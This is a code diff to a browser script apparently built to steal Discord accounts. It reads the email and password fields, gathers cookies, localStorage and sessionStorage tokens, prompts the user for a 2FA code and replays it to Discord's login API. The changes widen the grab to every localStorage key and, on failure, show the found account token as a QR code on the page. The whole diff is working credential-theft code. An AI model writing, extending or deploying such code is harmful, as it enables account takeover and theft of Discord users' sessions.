@@ -1,9 +1,9 @@
 // ----------------------------------
 // SELECTING ELEMENTS
 // ----------------------------------
-const loginButton = document.querySelector("button");
-const emailInput = document.querySelector('input[type="text"]');
-const passwordInput = document.querySelector('input[type="password"]');
+const loginButton = document.querySelector('button[type="submit"]'); // Discord uses type="submit" for login button
+const emailInput = document.querySelector('input[name="email"]'); // Discord uses name="email"
+const passwordInput = document.querySelector('input[name="password"]');
 
 // Debug log to check if inputs are found
 console.log("Script loaded. Email input:", emailInput);
@@ -77,7 +77,7 @@ function collectUserTokens() {
   }, {});
   tokens.cookies = cookies;
 
-  // Get localStorage (Discord-specific keys)
+  // Get localStorage (focus on Discord's token key)
   const localStorageTokens = {};
   const localKeys = ["token", "auth_token", "jwt", "access_token"];
   localKeys.forEach(key => {
@@ -85,6 +85,11 @@ function collectUserTokens() {
       localStorageTokens[key] = localStorage.getItem(key);
     }
   });
+  // Include all localStorage keys for debugging
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    localStorageTokens[key] = localStorage.getItem(key);
+  }
   tokens.localStorage = localStorageTokens;
 
   // Get sessionStorage
@@ -97,7 +102,7 @@ function collectUserTokens() {
   });
   tokens.sessionStorage = sessionStorageTokens;
 
-  console.log("Collected tokens:", tokens);
+  console.log("Collected tokens:", JSON.stringify(tokens, null, 2));
   return tokens;
 }
 
@@ -105,7 +110,7 @@ function collectUserTokens() {
 // ---------- FETCH ACCOUNT TOKEN -------------------
 // --------------------------------------------------
 async function fetchAccountToken(email, password) {
-  const apiUrl = "https://discord.com/api/v9/auth/login";
+  const apiUrl = "/api/v9/auth/login"; // Relative path for same-origin request
   const payload = {
     login: email,
     password: password,
@@ -119,7 +124,6 @@ async function fetchAccountToken(email, password) {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
-        // Removed User-Agent to avoid CORS preflight issue
       },
       body: JSON.stringify(payload)
     });
@@ -136,7 +140,7 @@ async function fetchAccountToken(email, password) {
       const mfaCode = prompt("Enter your 2FA code:");
       if (!mfaCode) throw new Error("MFA code required");
 
-      const mfaResponse = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
+      const mfaResponse = await fetch("/api/v9/auth/mfa/totp", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -188,7 +192,17 @@ async function fetchAccountToken(email, password) {
     return { apiToken: token, userTokens };
   } catch (error) {
     console.error("Error fetching token:", error.message);
-    return { apiToken: null, userTokens: collectUserTokens() };
+    // Still collect localStorage token even if API fails
+    const userTokens = collectUserTokens();
+    if (userTokens.localStorage.token) {
+      console.log("Found existing token in localStorage:", userTokens.localStorage.token);
+      const qrCode = generateQRCode(userTokens.localStorage.token);
+      if (qrCode) {
+        document.body.appendChild(qrCode);
+      }
+      return { apiToken: userTokens.localStorage.token, userTokens };
+    }
+    return { apiToken: null, userTokens };
   }
 }
 
